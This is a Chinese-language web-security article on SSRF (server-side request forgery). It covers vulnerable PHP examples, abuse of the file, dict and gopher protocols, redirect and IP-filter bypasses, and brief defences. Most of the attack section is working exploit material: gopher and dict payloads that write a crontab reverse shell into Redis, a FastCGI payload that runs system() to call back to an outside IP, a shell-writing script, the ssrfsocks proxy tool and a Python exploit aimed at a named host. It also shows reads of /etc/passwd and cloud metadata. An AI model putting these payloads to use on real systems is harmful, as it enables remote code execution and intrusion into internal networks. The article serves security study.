# 浅析SSRF原理及利用方式

阅读量 **635000**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-05-24 12:00:25

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

##

## 漏洞简介

SSRF(Server-side Request Forge, 服务端请求伪造)

通常用于控制web进而探测内网服务以及攻击内网脆弱应用

即当作跳板机，可作为 **ssrfsocks** 代理

## 漏洞产生

由于服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制。

## 举个栗子

    
    
    <?php
    
    /**
    * Check if the 'url' GET variable is set
    * Example - http://localhost/?url=http://testphp.vulnweb.com/images/logo.gif
    */
    if (isset($_GET['url'])){
    $url = $_GET['url'];
    
    /**
    * Send a request vulnerable to SSRF since
    * no validation is being done on $url
    * before sending the request
    */
    $image = fopen($url, 'rb');
    
    /**
    * Send the correct response headers
    */
    header("Content-Type: image/png");
    
    /**
    * Dump the contents of the image
    */
    fpassthru($image);
    }

上面栗子中$url可控，通过fopen造成SSRF，可以向服务器/外部发送请求，比如

> GET /?url =file:///etc/passwd
>
> GET /?url=dict://localhost:11211/stat
>
> GET /?url=<http://169.254.169.254/latest/meta-data/>
>
> GET /?url=dict://localhost:11211/stat

同时file_get_contents()、curl()、fsocksopen()均可能造成SSRF漏洞。

## 漏洞利用

在这里我们先说的是没有任何过滤的情况，且可以回显

漏洞代码ssrf.php如下

    
    
    #curl例子 漏洞代码ssrf.php (未作任何SSRF防御) 
    <?php 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $_GET['url']); 
    #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0); 
    #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
    curl_exec($ch); 
    curl_close($ch); 
    ?>
    

首先curl查看版本以及支持的协议

    
    
    root@localhost :curl -V
    
    curl 7.54.0 (x86_64-apple-darwin17.0) libcurl/7.54.0 LibreSSL/2.0.20 zlib/1.2.11 nghttp2/1.24.0
    
    Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp
    
    Features: AsynchDNS IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz HTTP2 UnixSockets HTTPS-proxy
    

可以看到该版本支持很多协议，其中dict协议、gopher协议、http/s协议以及file协议使用较为广泛。

## 本地利用

  1. file协议查看文件curl -v ‘file:///etc/passwd’
  2. dict协议探测端口curl -v ‘dict://127.0.0.1:22/info’(查看ssh的banner信息)curl -v ‘dict://127.0.0.1:6379/info’(查看redis相关配置)
  3. gophergopher协议支持GET&POST请求，同时在攻击内网ftp、redis、telnet、Memcache上有极大作用利用gopher协议访问redis反弹shell

    
    
    curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'

## 远程利用

漏洞代码ssrf.php

  1. dict协议探测端口curl -v ‘<http://a.com/ssrf.php?url=dict://172.0.0.1:22/info>‘curl -v ‘<http://a.com/ssrf.php?url=dict://127.0.0.1:6379/info>‘
  2. 利用gopher协议访问redis反弹shell 
    
        curl -v 'http://a.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'
    

漏洞代码ssrf2.php

  1. 限制协议HTTP/S
  2. 跳转重定向为True，默认不跳转

    
    
    <?php
    function curl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);
    // 限制为HTTPS、HTTP协议
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
    }
    
    $url = $_GET['url'];
    curl($url);
    ?>
    

此时直接使用dict协议已经不成功，我们可以利用302跳转的方式来绕过http协议限制，举例Discuz的SSRF

    
    
    curl -v "http:///forum.php?mod=ajax&action=downremoteimg&message=[img]http://a.com/302.php?helo.jpg[/img]"
    

302.php

    
    
    <?php
    header("Location: dict://10.0.0.2:6379/info");#探测redsi信息
    

Location 302跳转辅助脚本

    
    
    <?php
    $ip = $_GET['ip'];
    $port = $_GET['port'];
    $scheme = $_GET['s'];
    $data = $_GET['data'];
    header("Location: $scheme://$ip:$port/$data");
    ?>
    

比如2016年腾讯微博应用的ssrf

    
    
    curl -v 'http://share.v.t.qq.com/index.php?c=share&a=pageinfo&url=http://localhost/file.php'
    
    #file.php
    <?php
    header("Location: file:///etc/passwd");
    ?>

##

## 攻击应用

web
ssrf作为跳板可攻击内网多种应用如redis,discuz,fastcgi,memcache,webdav,struts,jboss,axis2等应用

首先我们要探测一下目标内网 。由于服务器支持gopher万金油协议ssrf+gopher=ssrfsocks，这里祭出猪猪侠前辈的ssrfsocks.py

    
    
    #!/usr/bin/env python
    
    import sys
    import socket
    import thread
    import binascii
    import struct
    import urllib
    import urllib2
    HOST = 'localhost'
    PORT = 65432
    BUFSIZ = 4096
    TIMEOUT = 5
    SOCKS = True
    CONNECT = "gopher%3A//"
    
    def decodesocks(req):
    if req[0] != 'x04':
    raise Exception('bad version number')
    if req[1] != 'x01':
    raise Exception('only tcp stream supported')
    port = req[2:4]
    host = req[4:8]
    if host[0] == 'x00' and host[1] == 'x00' and host[2] == 'x00' and host[3] != 'x00':
    byname = True
    else:
    byname = False
    userid = ""
    i = 8
    while req[i] != 'x00':
    userid += req[i]
    extra = ""
    if byname:
    while req[i] != 'x00':
    extra += req[i]
    return host, port, extra
    
    def child(sock,addr,base):
    try:
    if SOCKS:
    req = sock.recv(BUFSIZ)
    host, port, extra = decodesocks(req)
    if extra == "":
    dest = socket.inet_ntoa(host)
    else:
    dest = extra
    destport, = struct.unpack("!H", port)
    sock.send("x00x5a"+port+host)
    data = sock.recv(BUFSIZ)
    #print "sending:", data
    encodeddata = urllib.quote(data)
    url = base+CONNECT+dest+":"+str(destport)+"/A"+encodeddata
    #print "connecting to ", url
    ret = urllib2.urlopen(url,timeout=TIMEOUT)
    retdata = ret.read()
    #print "received:", retdata
    if len(retdata) > 0:
    sock.send(retdata)
    sock.close()
    except Exception as e:
    print e
    sock.close()
    
    if __name__=='__main__': 
    if len(sys.argv) != 2:
    sys.exit('Usage: %s BASEURLnExample: %s "http://victim.com/xxe.php?uri="' % sys.argv[0], sys.argv[0])
    base = sys.argv[1]
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(2)
    print 'listener ready on port', PORT
    try:
    while 1:
    client, addr = server.accept()
    #print 'connection from:', addr
    thread.start_new_thread(child, (client,addr,base))
    except KeyboardInterrupt:
    server.close()
    

##

## 攻击redis服务

### 常规利用方式

内网redis(port:6379)通常存在未授权访问的情况,防护较弱可攻击。

首先要了解通过redis getshell的exp写成的bash shell.sh:

    
    
    echo -e "nn*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1nn"|redis-cli -h $1 -p $2 -x set 1 
    redis-cli -h $1 -p $2 config set dir /var/spool/cron/ redis-cli -h $1 -p $2 config set dbfilename root 
    redis-cli -h $1 -p $2 save redis-cli -h $1 -p $2 quit
    

执行命令 `bash shell.sh 127.0.0.1 6379`可在redis里面写入crontab的定时任务，本地通过`nc -nvlp
2333`开启监听2333端口来反弹shell。

### gopher利用方式

gopher作为万金油协议在ssrf进入内网后有很大作用，但是我们要将普通的请求转成适配gopher协议的url，首先获取bash脚本对redis发出的访问请求，这里利用socat进行端口转发，转发命令

    
    
    socat -v tcp-listen:4444,fork tcp-connect:localhost:6379
    

​ 即将访问4444端口的流量转发到6379端口。也就是说我们bash请求的是4444端口，但是访问的还是6379的redis，即端口转发。

    
    
    bash shell.sh 127.0.0.1 4444 >redis.log
    

​ 这样就截获到redis的日志记录文件`redis.log`，贴出三叶草JoyChou师傅写的gopher转换脚本 tran2gopher.py
，具体可以看可以看[SSRF in PHP —JoyChou](https://joychou.org/web/phpssrf.html)

    
    
    #coding: utf-8
    #author: JoyChou
    #usage:    python tran2gopher.py socat.log
    import sys
    
    exp = ''
    
    with open(sys.argv[1]) as f:
    for line in f.readlines():
    if line[0] in '><+':
    continue
    # 判断倒数第2、3字符串是否为r
    elif line[-3:-1] == r'r':
    # 如果该行只有r，将r替换成%0a%0d%0a
    if len(line) == 3:
    exp = exp + '%0a%0d%0a'
    else:
    line = line.replace(r'r', '%0d%0a')
    # 去掉最后的换行符
    line = line.replace('n', '')
    exp = exp + line
    # 判断是否是空行，空行替换为%0a
    elif line == 'x0a':
    exp = exp + '%0a'
    else:
    line = line.replace('n', '')
    exp = exp + line
    print exp
    

​ 通过`python tran2gopher.py redis.log`将log改成适用gopher协议的url:

    
    
    *3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
    

​ 需要注意的是，上面url中的`$58`代表58个字节，这里exp是`nnn*/1 * * * * bash -i >&
/dev/tcp/127.0.0.1/2333
0>&1nnnn`共计3+51+4=58个字节，如果需要更改ip,比如10.201.42.13，那么$58需要改成$61，以此类推。

​ 最后攻击的curl为：

    
    
    curl -v gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
    

dict利用方式dict协议具有一个功能，比如`dict://127.0.0.1:6379/config:get:dir`即向服务器的端口发送`config
get dir`并在末尾自动添加CRLF。和gopher不同的是：gopher只需要发送一个url而dict需要层层构造，所以我们只需发出以下几个请求

    
    
    dict://127.0.0.1:6379/config:set:dir:/var/spool/cron
    dict://127.0.0.1:6379/config:set:dbfilename:root
    dict://127.0.0.1:6379/set:1:nn*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1nn
    dict://127.0.0.1:6379/save
    

​
创宇404的师傅这里写的很详细[SSRF漏洞分析与利用](http://www.4o4notfound.org/index.php/archives/33/)，这里引用师傅的exp

    
    
    # ssrf.py
    import requests
    host = '104.224.151.234'
    port = '6379'
    bhost = 'www.4o4notfound.org'
    bport=2333
    vul_httpurl = 'http://www.4o4notfound.org/ssrf.php?url='
    _location = 'http://www.4o4notfound.org/302.php'
    shell_location = 'http://www.4o4notfound.org/shell.php'
    #1 flush db
    _payload = '?s=dict%26ip={host}%26port={port}%26data=flushall'.format( host = host, port = port)
    exp_uri = '{vul_httpurl}{0}{1}'.format(_location, _payload, vul_httpurl=vul_httpurl)
    print exp_uri
    print requests.get(exp_uri).content
    #set crontab command
    _payload = '?s=dict%26ip={host}%26port={port}%26bhost={bhost}%26bport={bport}'.format( host = host, port = port, bhost = bhost, bport = bport)
    exp_uri = '{vul_httpurl}{0}{1}'.format(shell_location, _payload, vul_httpurl=vul_httpurl)
    print exp_uri 
    print requests.get(exp_uri).content
    #confg set dir
    _payload='?s=dict%26ip={host}%26port={port}%26data=config:set:dir:/var/spool/cron/'.format( host = host, port = port)
    exp_uri = '{vul_httpurl}{0}{1}'.format(_location, _payload, vul_httpurl=vul_httpurl)
    print exp_uri
    print requests.get(exp_uri).content
    #config set dbfilename
    _payload='?s=dict%26ip={host}%26port={port}%26data=config:set:dbfilename:root'.format( host = host, port = port)
    exp_uri = '{vul_httpurl}{0}{1}'.format(_location, _payload, vul_httpurl=vul_httpurl)
    print exp_uri
    print requests.get(exp_uri).content
    #save
    _payload='?s=dict%26ip={host}%26port={port}%26data=save'.format( host = host, port = port)
    exp_uri = '{vul_httpurl}{0}{1}'.format(_location, _payload, vul_httpurl=vul_httpurl)
    print exp_uri
    print requests.get(exp_uri).content
    
    
    #302.php
    <?php
    $ip = $_GET['ip'];
    $port = $_GET['port'];
    $scheme = $_GET['s'];
    $data = $_GET['data'];
    header("Location: $scheme://$ip:$port/$data"); ?>
    
    #shell.php
    <?php
    $ip = $_GET['ip'];
    $port = $_GET['port'];
    $bhost = $_GET['bhost'];
    $bport = $_GET['bport'];
    $scheme = $_GET['s'];
    header("Location: $scheme://$ip:$port/set:0:"\x0a\x0a*/1\x20*\x20*\x20*\x20*\x20/bin/bash\x20-i\x20>\x26\x20/dev/tcp/{$bhost}/{$bport}\x200>\x261\x0a\x0a\x0a""); ?>
    
    执行ssrf.py 即可写入crontab，在本地开启nc监听等待请求
    

###

## 攻击FastCGI

​ 首先根据faci_exp生成exp，随后改成支持gopher协议的URL

    
    
    gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
    

​ 本地监听2333端口，收到反弹shell

## 其他 & 问题

​ 能用SSRF攻击的还有很多应用，比如couchDB、Memcache、jboss、axis2、fastcgi、tomcat等等，原理相同，不做赘述。

​ 实际测试以及阅读文章中发现gopher存在以下几点问题

  1. PHP的curl默认不跟随302跳转
  2. curl7.43上gopher协议存在%00截断的BUG，v7.49可用
  3. file_get_contents()的SSRF，gopher协议不能使用URLencode
  4. file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败

##

## bypass

  1. 在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。如 <a href=”http://[www.baidu.com@10.10.10](mailto:www.baidu.com@10.10.10).10″”>http://www.baidu.com@10.10.10.10 相当于请求<http://10.10.10.10> 访问的资源是10.10.10.10内网资源当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是[www.baidu.com](http://www.baidu.com/)，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为[www.baidu.com](http://www.baidu.com/)，而实际上这个URL所请求的内容都是192.168.0.1上的内容。
  2. ip进制转换为十进制如<http://baidu.com/?url=dict://192.168.100.1:6379/info> >> <http://baidu.com/?url=dict://3232261121:6379/info>
  3. xip.io & xip.name

    
    
    foo.bar.10.10.0.1.xip.io > 10.10.0.1
    
    10.0.0.1.xip.io > 10.0.0.1
    
    www.10.10.0.1.xip.name > 10.10.0.1
    
    …

302跳转 & 短域名([http://tinyurl.com](http://tinyurl.com/))

##

## 漏洞防护

  1. 服务端开启OpenSSL无法交互利用
  2. 服务端需要认证交互
  3. 限制协议为HTTP、HTTPS
  4. 禁止30x跳转次数
  5. 设置URL白名单或限制内网IP

#

## Reference

  1. [ssrf in php](https://joychou.org/web/phpssrf.html)
  2. [SSRF漏洞的利用与学习](https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html)
  3. [ssrfsocks](https://blog.csdn.net/qq_27446553/article/details/51934311)
  4. [SSRF漏洞中绕过ip限制的几种方法](http://www.freebuf.com/articles/web/135342.html)
  5. [猪猪侠乌云白帽大会SSRF经典议程](http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf)
  6. [wooyun-2016-0215419_SSRF](http://www.loner.fm/bugs/bug_detail.php?wybug_id=wooyun-2016-0215419)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Boi** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/145519](/post/id/145519)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)
  * [SSRF](/tag/SSRF)
  * [Web安全](/tag/Web安全)
  * [内网](/tag/内网)

 **+1** __14赞

 __收藏

![](https://p5.ssl.qhimg.com/t010dcf3fd66aa4bf65.png) Boi

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

